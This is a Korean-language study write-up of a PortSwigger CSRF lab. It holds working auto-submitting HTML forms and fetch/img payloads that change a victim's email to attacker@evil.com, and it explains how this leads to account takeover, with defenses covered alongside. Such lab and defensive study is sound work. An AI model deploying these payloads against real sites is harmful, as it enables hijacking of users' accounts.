# Lab: CSRF vulnerability with no defenses

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Request Forgery (CSRF) — 기본 / 방어 없음 / 자동 폼 제출
- **링크**: https://portswigger.net/web-security/csrf/lab-no-defenses

## 목표

CSRF 방어가 전혀 없는 이메일 변경 기능을 이용해, 피해자가 공격자 페이지를 방문하는 순간 자동으로 폼이 제출되어 이메일이 변경되도록 한다.

## CSRF 란

```
Cross-Site Request Forgery (사이트 간 요청 위조)

공격 원리:
  브라우저는 특정 도메인의 쿠키를 해당 도메인으로의 요청에 자동으로 첨부
  → 피해자가 공격자 페이지를 방문하면
  → 공격자 페이지가 피해자 명의로 다른 사이트에 요청을 전송
  → 서버는 쿠키가 유효하므로 정상 요청으로 처리

XSS vs CSRF 비교:
  XSS  — 피해자 브라우저에서 공격자의 스크립트가 실행
         같은 origin 에서 실행 → SOP 제한 없음
  CSRF — 피해자 브라우저가 다른 origin 으로 요청을 전송
         스크립트 실행 없음 → 쿠키 자동 첨부만 이용
```

## 공격 방법

### 공격자 페이지 HTML (exploit server 에 호스팅)

```html
<html>
  <body>
    <form action="https://VULNERABLE-SITE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 동작 흐름

```
1. 피해자: 공격자 페이지 방문 (이메일 클릭, SNS 링크 등)

2. 브라우저: HTML 파싱 → <form> 발견

3. <script>document.forms[0].submit()</script> 실행
   → 페이지 로드 즉시 폼 자동 제출

4. POST 요청 전송:
   POST https://VULNERABLE-SITE.com/my-account/change-email
   Cookie: session=VICTIM_SESSION_COOKIE   ← 브라우저가 자동 첨부!
   Body: email=attacker@evil.com

5. 서버: 세션 쿠키 유효 → 정상 요청으로 처리
   → 이메일이 attacker@evil.com 으로 변경

6. 공격자: "비밀번호 찾기" → attacker@evil.com 으로 재설정 링크 수신
   → 계정 완전 탈취
```

## 왜 쿠키가 자동으로 붙는가

```
[브라우저의 쿠키 전송 규칙 (SameSite 미설정 기본값)]
  요청 대상 도메인과 일치하는 쿠키를 자동으로 전송

예:
  evil.com 의 페이지에서 vulnerable.com 으로 요청 전송
  → vulnerable.com 의 쿠키(session=...)가 자동으로 헤더에 포함됨
  → 서버는 브라우저가 보낸 쿠키를 신뢰

[이것이 CSRF 의 근본 원인]
  서버는 요청이 어떤 페이지에서 왔는지 검증하지 않음
  → 쿠키만 유효하면 정상 사용자의 요청으로 처리
```

## XSS 랩에서 경험한 내용과의 연결

```
024 랩 (XSS + CSRF):
  XSS 로 피해자 브라우저에서 직접 CSRF 토큰을 읽고
  fetch() 로 이메일 변경 요청 전송
  → XSS 필요 (같은 origin 에서 실행)

001 랩 (순수 CSRF):
  XSS 없이 별도 페이지(evil.com)에서 폼 자동 제출
  → 스크립트 실행은 evil.com 에서 일어남
  → 요청 자체는 vulnerable.com 으로 전송
  → 쿠키 자동 첨부 → 성공

공통점:
  두 경우 모두 "피해자의 인증 정보(쿠키)로 원하지 않는 요청을 전송"
```

## 핵심 정리

- CSRF 방어가 없으면 단순한 HTML 폼 + 자동 제출 스크립트만으로 피해자 명의의 상태 변경 요청이 가능하다.
- 브라우저의 쿠키 자동 첨부 동작이 CSRF 의 근본 원인이다.
- **방어**:
  - CSRF 토큰: 서버가 예측 불가능한 토큰을 폼에 삽입 → 공격자는 토큰 모름 → 위조 불가
  - `SameSite` 쿠키 속성: 외부 사이트에서의 요청에 쿠키 미전송
  - `Referer` / `Origin` 헤더 검증: 요청 출처 확인

## 배운 점 및 추가 학습

### 1. CSRF 공격이 가능한 조건

```
1. 세션 관리를 쿠키로 함 (자동 전송)
2. 공격자가 요청 형식을 알 수 있음 (HTML 소스, 공개 문서 등)
3. 서버가 요청 출처를 검증하지 않음 (CSRF 토큰 없음)
4. 피해자가 공격자 페이지를 방문 (소셜엔지니어링)

하나라도 빠지면 CSRF 불성립
```

### 2. 폼 자동 제출 방법 비교

```html
<!-- 방법 1: JS submit() (이번 랩) -->
<form id="f" action="..." method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- 방법 2: onload 이벤트 -->
<body onload="document.forms[0].submit()">
  <form action="..." method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>

<!-- 방법 3: 이미지 태그 (GET 요청용) -->
<img src="https://vulnerable.com/delete?id=123">
<!-- 이미지 로드 = GET 요청 → 쿠키 자동 첨부 -->

<!-- 방법 4: fetch (CORS 영향 있음) -->
<script>
fetch('https://vulnerable.com/change-email', {
  method: 'POST',
  credentials: 'include',  // 쿠키 포함
  body: 'email=attacker@evil.com'
})
</script>
<!-- 단순 요청(Simple Request) 조건 충족 시 CORS preflight 없이 전송 -->
```

### 3. CSRF 가 가능한 HTTP 메서드

```
GET  요청: 이미지/링크/iframe 으로 쉽게 전송
POST 요청: HTML 폼으로 전송 가능 (이번 랩)
PUT  요청: 폼으로 불가, fetch/XHR 필요 → CORS 제한
DELETE   : 동일

→ REST API가 PUT/DELETE 를 쓰면 CSRF 가 어려워지지만 완전한 방어는 아님
→ Content-Type: application/json 도 Simple Request 가 아니므로 preflight 발생
   → CORS preflight 차단으로 CSRF 방어 가능 (단, 완전한 방어는 아님)
```

### 4. CSRF 공격 대상이 되는 기능 유형

```
높은 위험:
  이메일 변경       → 계정 탈취 경로
  비밀번호 변경     → 직접 탈취
  계정 삭제         → 서비스 방해
  결제/이체         → 금전 피해
  관리자 권한 부여  → 권한 상승

중간 위험:
  프로필 변경       → 정보 변조
  알림 설정 변경    → 피싱 유도
  공개/비공개 전환  → 정보 노출

낮은 위험 (상태 변경 없음):
  검색              → CSRF 해도 의미 없음
  목록 조회         → 동일
```

### 5. CSRF 토큰 방어 원리 (다음 랩 예고)

```
[방어 없음 — 이번 랩]
POST /change-email
Cookie: session=abc
Body: email=attacker@evil.com  ← 공격자가 그대로 위조 가능

[CSRF 토큰 방어]
POST /change-email
Cookie: session=abc
Body: email=attacker@evil.com
      csrf=RANDOM_TOKEN         ← 공격자는 이 값을 모름!

서버: 토큰 검증 → 공격자 요청 거부

공격자가 토큰을 알 수 없는 이유:
  → 토큰은 HTML 폼에 hidden 으로 삽입됨
  → 공격자 페이지(evil.com)에서 피해자의 토큰을 읽으려면
    → AJAX로 페이지 요청 필요 → SOP가 응답 읽기를 차단
  → 결국 공격자는 토큰 값을 알 수 없음
  → CSRF 불가
```
